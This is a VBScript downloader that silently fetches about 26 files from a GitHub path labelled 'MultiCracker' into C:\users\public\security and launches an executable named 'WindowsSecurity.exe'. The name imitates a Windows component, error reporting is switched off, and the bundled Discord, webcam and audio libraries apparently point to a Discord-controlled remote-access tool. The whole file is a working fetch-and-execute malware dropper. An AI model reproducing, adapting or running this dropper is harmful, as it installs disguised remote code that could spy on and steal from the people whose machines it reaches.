Option Explicit
On Error Resume Next

Dim objXMLHTTP, strFileURLs, strHDLocations, i

strFileURLs = Array( _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/AForge.dll", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/AForge.Video.DirectShow.dll", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/AForge.Video.dll", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/Discord.Net.Commands.dll", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/Discord.Net.Core.dll", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/Discord.Net.Interactions.dll", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/Discord.Net.Rest.dll", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/Discord.Net.Webhook.dll", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/Discord.Net.WebSocket.dll", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/Microsoft.Extensions.DependencyInjection.Abstractions.dll", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/WindowsSecurity.deps.json", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/WindowsSecurity.dll", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/WindowsSecurity.exe", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/WindowsSecurity.pdb", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/WindowsSecurity.runtimeconfig.json", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/NAudio.Asio.dll", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/NAudio.Core.dll", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/NAudio.dll", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/NAudio.Midi.dll", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/NAudio.Wasapi.dll", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/NAudio.WinForms.dll", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/NAudio.WinMM.dll", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/Newtonsoft.Json.dll", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/System.Interactive.Async.dll", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/System.Linq.Async.dll", _
    "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.5.0/System.Reactive.dll" _
)

strHDLocations = Array( _
    "C:\users\public\security\AForge.dll", _
    "C:\users\public\security\AForge.Video.DirectShow.dll", _
    "C:\users\public\security\AForge.Video.dll", _
    "C:\users\public\security\Discord.Net.Commands.dll", _
    "C:\users\public\security\Discord.Net.Core.dll", _
    "C:\users\public\security\Discord.Net.Interactions.dll", _
    "C:\users\public\security\Discord.Net.Rest.dll", _
    "C:\users\public\security\Discord.Net.Webhook.dll", _
    "C:\users\public\security\Discord.Net.WebSocket.dll", _
    "C:\users\public\security\Microsoft.Extensions.DependencyInjection.Abstractions.dll", _
    "C:\users\public\security\WindowsSecurity.deps.json", _
    "C:\users\public\security\WindowsSecurity.dll", _
    "C:\users\public\security\WindowsSecurity.exe", _
    "C:\users\public\security\WindowsSecurity.pdb", _
    "C:\users\public\security\WindowsSecurity.runtimeconfig.json", _
    "C:\users\public\security\NAudio.Asio.dll", _
    "C:\users\public\security\NAudio.Core.dll", _
    "C:\users\public\security\NAudio.dll", _
    "C:\users\public\security\NAudio.Midi.dll", _
    "C:\users\public\security\NAudio.Wasapi.dll", _
    "C:\users\public\security\NAudio.WinForms.dll", _
    "C:\users\public\security\NAudio.WinMM.dll", _
    "C:\users\public\security\Newtonsoft.Json.dll", _
    "C:\users\public\security\System.Interactive.Async.dll", _
    "C:\users\public\security\System.Linq.Async.dll", _
    "C:\users\public\security\System.Reactive.dll" _
)

Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")

Dim objFSO
Set objFSO = CreateObject("Scripting.FileSystemObject")

For i = LBound(strHDLocations) To UBound(strHDLocations)
    Dim strDirectory
    strDirectory = objFSO.GetParentFolderName(strHDLocations(i))
    If Not objFSO.FolderExists(strDirectory) Then
        objFSO.CreateFolder(strDirectory)
    End If
Next

Set objFSO = Nothing

For i = LBound(strFileURLs) To UBound(strFileURLs)
    Dim strFileURL, strFileName, strHDLocation
    strFileURL = strFileURLs(i)
    strFileName = Mid(strFileURL, InStrRev(strFileURL, "/") + 1)
    strHDLocation = strHDLocations(i)
    objXMLHTTP.Open "GET", strFileURL, False
    objXMLHTTP.send
    If objXMLHTTP.Status = 200 Then
        Dim objADOStream
        Set objADOStream = CreateObject("ADODB.Stream")
        objADOStream.Open
        objADOStream.Type = 1
        objADOStream.Write objXMLHTTP.ResponseBody
        objADOStream.Position = 0
        objADOStream.SaveToFile strHDLocation
        objADOStream.Close
        Set objADOStream = Nothing
    End If
Next

Dim objShell
Set objShell = CreateObject("WScript.Shell")
objShell.Run "C:\users\public\security\WindowsSecurity.exe", 1, False

Set objXMLHTTP = Nothing